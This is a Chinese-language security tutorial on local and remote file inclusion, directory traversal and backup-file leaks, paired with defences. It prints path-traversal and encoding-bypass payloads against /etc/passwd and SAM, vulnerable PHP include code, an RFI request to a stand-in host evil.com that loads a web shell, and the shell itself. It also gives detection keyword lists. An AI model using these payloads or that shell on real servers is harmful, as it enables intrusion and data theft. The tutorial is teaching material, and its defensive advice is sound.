---
title: 2、文件包含与目录遍历
---
## 📚 目录

1. [文件包含攻击基础概念](#1-文件包含攻击基础概念)
2. [本地文件包含（LFI）攻击](#2-本地文件包含lfi攻击)
3. [远程文件包含（RFI）攻击](#3-远程文件包含rfi攻击)
4. [目录遍历攻击详解](#4-目录遍历攻击详解)
5. [敏感文件泄露风险](#5-敏感文件泄露风险)
6. [备份文件泄露攻击](#6-备份文件泄露攻击)
7. [综合防护策略](#7-综合防护策略)
8. [核心要点总结](#8-核心要点总结)

---

## 1. 📂 文件包含攻击基础概念


### 1.1 什么是文件包含攻击


**简单理解**：就像你本来想让程序读取指定的文件，但攻击者却骗程序去读取了不该读的文件。

```
正常情况：
用户请求 → 程序读取合法文件 → 返回正确内容

攻击情况：
攻击者请求 → 程序被骗读取敏感文件 → 泄露机密信息
```

**核心问题**：程序没有严格检查要读取的文件是否安全。

### 1.2 文件包含攻击的本质


**攻击原理图**：
```
Web应用程序
     ↓
   文件读取功能
     ↓
┌─────────────────┐      ┌──────────────────┐
│   用户输入      │ ──→  │   文件路径拼接    │
│ (可被恶意构造)  │      │  (缺乏安全检查)   │
└─────────────────┘      └──────────────────┘
     ↓                           ↓
┌─────────────────┐      ┌──────────────────┐
│   恶意文件路径   │ ──→  │   读取敏感文件    │
│   构造成功      │      │   信息泄露       │
└─────────────────┘      └──────────────────┘
```

### 1.3 攻击类型分类


| 攻击类型 | **攻击源** | **危害程度** | **常见场景** |
|---------|-----------|-------------|-------------|
| **本地文件包含(LFI)** | `服务器本地文件` | `高` | `读取配置文件、密码文件` |
| **远程文件包含(RFI)** | `外部恶意文件` | `极高` | `执行恶意代码、植入后门` |
| **目录遍历** | `路径穿越` | `中高` | `访问上级目录敏感文件` |

---

## 2. 🎯 本地文件包含（LFI）攻击


### 2.1 LFI攻击原理


**什么是本地文件包含**：攻击者利用程序漏洞，读取服务器上不应该被访问的本地文件。

**攻击流程示意**：
```
1. 发现存在文件包含功能的页面
   ↓
2. 构造恶意文件路径参数
   ↓  
3. 绕过程序的简单过滤
   ↓
4. 成功读取敏感的本地文件
   ↓
5. 获取配置信息、密码等机密数据
```

### 2.2 典型的LFI漏洞代码


**脆弱的PHP代码示例**：
```php
<?php
// 危险代码 - 直接使用用户输入
$file = $_GET['page'];
include($file . '.php');
?>

// 用户正常访问：
// index.php?page=home  → 包含 home.php

// 攻击者恶意访问：
// index.php?page=../../../etc/passwd → 包含 /etc/passwd 文件
```

**为什么这样很危险**：
- 程序直接相信用户输入的文件名
- 没有检查文件路径是否合法
- 允许使用 `../` 跳出安全目录

### 2.3 LFI攻击常用技巧


**🔸 路径穿越技巧**
```
基本路径穿越：
../../../etc/passwd

URL编码绕过：
..%2F..%2F..%2Fetc%2Fpasswd

双重编码绕过：
..%252F..%252F..%252Fetc%252Fpasswd

混合大小写：
..%2f..%2f..%2fetc%2fpasswd
```

**🔸 空字节注入（PHP < 5.3.4）**
```php
// 原始代码会自动添加.php后缀
include($_GET['file'] . '.php');

// 攻击payload：
?file=../../../etc/passwd%00

// 实际包含的文件：
../../../etc/passwd (空字节后的.php被忽略)
```

### 2.4 LFI攻击目标文件


**Linux系统常见目标**：
```
/etc/passwd          - 用户账户信息
/etc/shadow          - 密码哈希值
/etc/hosts           - 主机解析配置
/proc/version        - 系统版本信息
/proc/self/environ   - 环境变量信息
/var/log/apache2/access.log - Web访问日志
```

**Windows系统常见目标**：
```
C:\Windows\System32\drivers\etc\hosts - 主机配置
C:\Windows\System32\config\SAM        - 用户密码数据库
C:\inetpub\logs\LogFiles\              - IIS日志文件
C:\Windows\win.ini                     - Windows配置文件
```

### 2.5 LFI攻击实战示例


**攻击场景演示**：
```
目标网站：http://example.com/view.php?file=news
正常功能：显示新闻页面内容

攻击测试步骤：
1. 测试路径穿越：
   ?file=../index
   
2. 尝试读取系统文件：
   ?file=../../../../etc/passwd
   
3. 查看Web服务器配置：
   ?file=../../../../etc/apache2/apache2.conf
   
4. 获取数据库配置：
   ?file=../config/database.conf
```

---

## 3. 🌐 远程文件包含（RFI）攻击


### 3.1 RFI攻击原理


**什么是远程文件包含**：攻击者让程序去读取并执行来自外部服务器的恶意文件。

**RFI vs LFI 对比**：
```
本地文件包含(LFI)：
程序 → 读取本服务器文件 → 信息泄露

远程文件包含(RFI)：
程序 → 下载执行外部文件 → 代码执行 → 服务器被控制
```

### 3.2 RFI攻击流程


**攻击步骤示意图**：
```
步骤1: 攻击者准备恶意文件
    ↓
步骤2: 将恶意文件放到自己的服务器
    ↓
步骤3: 构造包含外部文件的请求
    ↓
步骤4: 目标服务器下载并执行恶意文件
    ↓
步骤5: 获得服务器控制权
```

### 3.3 RFI漏洞代码示例


**危险的PHP代码**：
```php
<?php
// 极度危险的代码
$page = $_GET['page'];
include($page);
?>

// 攻击者的利用方式：
// target.php?page=http://evil.com/shell.php
```

**攻击者服务器上的恶意文件（shell.php）**：
```php
<?php
// 简单的Web Shell
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
echo "恶意代码已执行!";
?>
```

### 3.4 RFI攻击的严重后果


**危害程度分析**：
```
🔴 极高危害：
- 直接获得代码执行权限
- 可以安装持久化后门
- 能够窃取所有服务器数据
- 可以进一步攻击内网其他系统

实际影响：
1. 数据库被脱库
2. 网站被篡改
3. 服务器成为肉鸡
4. 客户资料泄露
5. 业务完全瘫痪
```

### 3.5 RFI攻击防护要点


**🔸 配置层面防护**
```php
// PHP配置文件 php.ini
allow_url_include = Off    // 禁用远程文件包含
allow_url_fopen = Off      // 禁用远程文件打开
```

**🔸 代码层面防护**
```php
<?php
// 安全的文件包含方式
$allowed_files = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $allowed_files)) {
    include($page . '.php');
} else {
    include('error.php');
}
?>
```

---

## 4. 📁 目录遍历攻击详解


### 4.1 目录遍历攻击原理


**什么是目录遍历**：攻击者通过构造特殊的路径（如 `../`），访问到不应该访问的上级目录文件。

**攻击路径示意**：
```
正常访问路径：
/var/www/html/uploads/userfile.txt

目录遍历攻击路径：
/var/www/html/uploads/../../../etc/passwd

实际访问到：
/etc/passwd
```

### 4.2 路径穿越技术详解


**🔸 基础路径穿越**
```
../                    - 返回上一级目录
../../                 - 返回上两级目录  
../../../              - 返回上三级目录
```

**🔸 绝对路径攻击**
```
直接指定绝对路径：
/etc/passwd
C:\Windows\System32\config\SAM
```

**🔸 编码绕过技术**
```
URL编码：
..%2F..%2F..%2Fetc%2Fpasswd

Unicode编码：
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

16进制编码：
..%5c..%5c..%5cetc%5cpasswd
```

### 4.3 目录遍历攻击场景


**典型漏洞场景**：
```php
// 文件下载功能
<?php
$filename = $_GET['file'];
$file_path = './downloads/' . $filename;
readfile($file_path);
?>

// 攻击利用：
// download.php?file=../../../etc/passwd
```

**攻击测试用例**：
```
测试1: ?file=../index.php
测试2: ?file=../../config.php  
测试3: ?file=../../../etc/passwd
测试4: ?file=....//....//etc/passwd
测试5: ?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### 4.4 高级目录遍历技巧


**🔸 过滤器绕过**
```
过滤 "../" 的绕过方法：
....//....//etc/passwd    (双斜杠)
..././..././etc/passwd     (混合字符)
....\.....\etc\passwd      (反斜杠混合)
```

**🔸 长路径攻击**
```
构造超长路径绕过长度限制：
../../../../../../../../../../../../../../../etc/passwd
```

---

## 5. 🔐 敏感文件泄露风险


### 5.1 常见敏感文件清单


**🔸 系统配置文件**
```
Linux系统：
/etc/passwd               - 用户信息
/etc/shadow               - 密码哈希
/etc/group                - 组信息
/etc/sudoers              - sudo权限配置
/etc/ssh/sshd_config      - SSH服务配置

Windows系统：
C:\Windows\System32\config\SAM - 密码数据库
C:\Windows\win.ini              - 系统配置
C:\Windows\System32\drivers\etc\hosts - 主机配置
```

**🔸 Web应用配置文件**
```
数据库配置：
config/database.php
config/db.conf
.env
settings.ini

应用配置：
config.php
application.conf
web.config
.htaccess
```

### 5.2 日志文件泄露风险


**日志文件攻击价值**：
```
访问日志泄露信息：
- 用户访问模式
- 系统路径结构
- 其他用户的敏感操作
- 管理员访问路径

错误日志泄露信息：
- 数据库连接字符串
- 文件系统路径
- 代码执行错误信息
- 系统版本信息
```

**常见日志文件位置**：
```
Apache日志：
/var/log/apache2/access.log
/var/log/apache2/error.log

Nginx日志：
/var/log/nginx/access.log
/var/log/nginx/error.log

应用日志：
/var/log/app/application.log
./logs/debug.log
```

### 5.3 源代码泄露风险


**源代码泄露途径**：
```
1. 备份文件泄露：
   index.php.bak
   config.php~
   database.sql.old

2. 版本控制文件：
   .git/config
   .svn/entries
   .hg/hgrc

3. 编辑器临时文件：
   .index.php.swp
   #config.php#
   config.php.tmp
```

---

## 6. 📦 备份文件泄露攻击


### 6.1 备份文件泄露原理


**什么是备份文件泄露**：开发者或系统管理员在服务器上留下的备份文件，被攻击者通过Web访问获取。

**泄露风险示意**：
```
开发过程：
index.php (正常文件) + index.php.bak (备份文件)
    ↓
部署到服务器：
忘记删除 .bak 文件
    ↓
攻击者发现：
直接下载备份文件获取源代码
```

### 6.2 常见备份文件命名规则


**🔸 文件扩展名备份**
```
.bak        - index.php.bak
.backup     - config.php.backup  
.old        - database.php.old
.orig       - settings.php.orig
.save       - config.php.save
.tmp        - temp.php.tmp
~           - config.php~
```

**🔸 编辑器自动备份**
```
Vim编辑器：
.index.php.swp
.config.php.swo

Emacs编辑器：
#index.php#
config.php~

其他编辑器：
index.php.tmp
config.php.backup
```

### 6.3 备份文件发现技术


**🔸 手工测试方法**
```
针对目标文件 config.php 的测试：
config.php.bak
config.php.backup
config.php.old
config.php~
config.php.save
config.bak
config.old
.config.php.swp
```

**🔸 自动化扫描思路**
```
扫描逻辑：
1. 发现正常文件：index.php
2. 生成备份文件字典：
   - index.php.bak
   - index.php.old  
   - index.php~
3. 批量请求测试
4. 分析HTTP响应判断文件存在
```

### 6.4 备份文件攻击实例


**攻击场景还原**：
```
步骤1: 发现目标网站
http://example.com/admin/login.php

步骤2: 猜测备份文件
http://example.com/admin/login.php.bak

步骤3: 成功下载备份文件
获得完整的登录页面源代码

步骤4: 分析源代码发现：
- 数据库连接信息
- 管理员默认密码
- SQL注入漏洞点
```

**防护失败案例**：
```
真实案例：某电商网站
泄露文件：database.php.bak
泄露内容：
- MySQL数据库地址
- 数据库用户名和密码  
- 数据库名称
- 表结构信息

攻击后果：
- 直接连接数据库
- 下载整个用户数据库
- 获取订单和支付信息
```

---

## 7. 🛡️ 综合防护策略


### 7.1 代码层面防护


**🔸 输入验证与过滤**
```php
<?php
function safe_include($filename) {
    // 白名单验证
    $allowed_files = [
        'home' => 'pages/home.php',
        'about' => 'pages/about.php', 
        'contact' => 'pages/contact.php'
    ];
    
    if (isset($allowed_files[$filename])) {
        include($allowed_files[$filename]);
    } else {
        include('pages/error.php');
    }
}

// 使用示例
$page = $_GET['page'] ?? 'home';
safe_include($page);
?>
```

**🔸 路径规范化**
```php
<?php
function secure_path($user_input) {
    // 移除危险字符
    $cleaned = str_replace(['../', '.\\', '..\\'], '', $user_input);
    
    // 限制在安全目录内
    $safe_dir = '/var/www/html/safe/';
    $full_path = $safe_dir . $cleaned;
    
    // 验证最终路径
    $real_path = realpath($full_path);
    if ($real_path && strpos($real_path, $safe_dir) === 0) {
        return $real_path;
    }
    
    return false;
}
?>
```

### 7.2 服务器配置防护


**🔸 PHP配置安全**
```ini
; php.ini 安全配置
allow_url_include = Off       ; 禁用远程包含
allow_url_fopen = Off         ; 禁用远程文件操作
open_basedir = /var/www/html  ; 限制文件访问范围
disable_functions = system,exec,shell_exec,passthru
```

**🔸 Web服务器配置**
```apache
# Apache .htaccess 配置
<Files ~ "\.(bak|backup|old|tmp|save)$">
    Order allow,deny
    Deny from all
</Files>

# 防止访问隐藏文件
<Files ~ "^\.">
    Order allow,deny  
    Deny from all
</Files>
```

### 7.3 文件系统防护


**🔸 文件权限管理**
```bash
# 设置正确的文件权限
chmod 644 *.php                    # PHP文件只读
chmod 600 config/database.php      # 配置文件限制访问
chmod 755 /var/www/html           # 目录权限

# 移除危险文件
find /var/www -name "*.bak" -delete
find /var/www -name "*~" -delete
find /var/www -name "*.tmp" -delete
```

**🔸 安全目录结构**
```
推荐的目录结构：
/var/www/
├── html/                    (Web根目录)
│   ├── public/             (公开访问)
│   └── assets/            (静态资源)
├── config/                 (配置文件，Web不可访问)
├── logs/                   (日志文件，Web不可访问)
└── backup/                (备份文件，Web不可访问)
```

### 7.4 监控与检测


**🔸 入侵检测规则**
```
监控关键词：
- ../
- ..\\
- %2e%2e%2f
- etc/passwd
- win.ini
- .bak

日志分析重点：
- 异常的文件访问请求
- 大量404错误（可能在扫描备份文件）
- 包含路径穿越字符的请求
```

**🔸 安全扫描检查**
```bash
# 定期安全检查脚本
#!/bin/bash

echo "检查备份文件..."
find /var/www -name "*.bak" -o -name "*~" -o -name "*.tmp"

echo "检查文件权限..."
find /var/www -type f -perm 777

echo "检查隐藏文件..."
find /var/www -name ".*" -type f
```

---

## 8. 📋 核心要点总结


### 8.1 必须掌握的核心概念


```
🔸 文件包含攻击：程序读取了不该读的文件
🔸 本地文件包含(LFI)：读取服务器本地敏感文件
🔸 远程文件包含(RFI)：执行外部恶意代码，危害极大
🔸 目录遍历：通过../路径跳出安全目录
🔸 备份文件泄露：开发过程遗留的备份文件被下载
🔸 敏感文件：配置文件、日志文件、源代码等机密信息
```

### 8.2 攻击危害等级


| 攻击类型 | **危害等级** | **主要风险** | **防护难度** |
|---------|-------------|-------------|-------------|
| **远程文件包含** | `🔴 极高` | `代码执行，服务器失控` | `中等` |
| **本地文件包含** | `🟠 高` | `敏感信息泄露` | `中等` |
| **目录遍历** | `🟡 中高` | `系统文件访问` | `较低` |
| **备份文件泄露** | `🟠 高` | `源代码泄露` | `极低` |

### 8.3 防护核心原则


**🔹 输入验证原则**
```
永远不要相信用户输入：
- 使用白名单验证
- 严格过滤危险字符
- 限制文件访问范围
```

**🔹 最小权限原则**
```
给程序最小的必要权限：
- 限制文件系统访问范围
- 禁用不必要的PHP函数
- 设置正确的文件权限
```

**🔹 深度防御原则**
```
多层次安全防护：
- 代码层：输入验证和路径检查
- 配置层：安全的服务器配置
- 系统层：文件权限和目录结构
- 监控层：入侵检测和日志分析
```

### 8.4 实战防护检查清单


**✅ 开发阶段检查**
- [ ] 文件包含功能使用白名单验证
- [ ] 禁止直接使用用户输入构造文件路径
- [ ] 使用安全的文件操作函数
- [ ] 代码审查重点检查文件操作部分

**✅ 部署阶段检查**
- [ ] 清理所有备份文件和临时文件
- [ ] 配置正确的PHP安全选项
- [ ] 设置Web服务器安全规则
- [ ] 建立安全的目录结构

**✅ 运维阶段检查**
- [ ] 定期扫描检查备份文件
- [ ] 监控异常的文件访问请求
- [ ] 及时更新和打补丁
- [ ] 定期进行安全测试

**核心记忆要点**：
- **文件包含攻击**：程序被骗读取不该读的文件
- **远程包含最危险**：可直接控制服务器
- **备份文件要清理**：开发遗留的定时炸弹
- **白名单是王道**：永远不相信用户输入
- **深度防御保安全**：多层防护缺一不可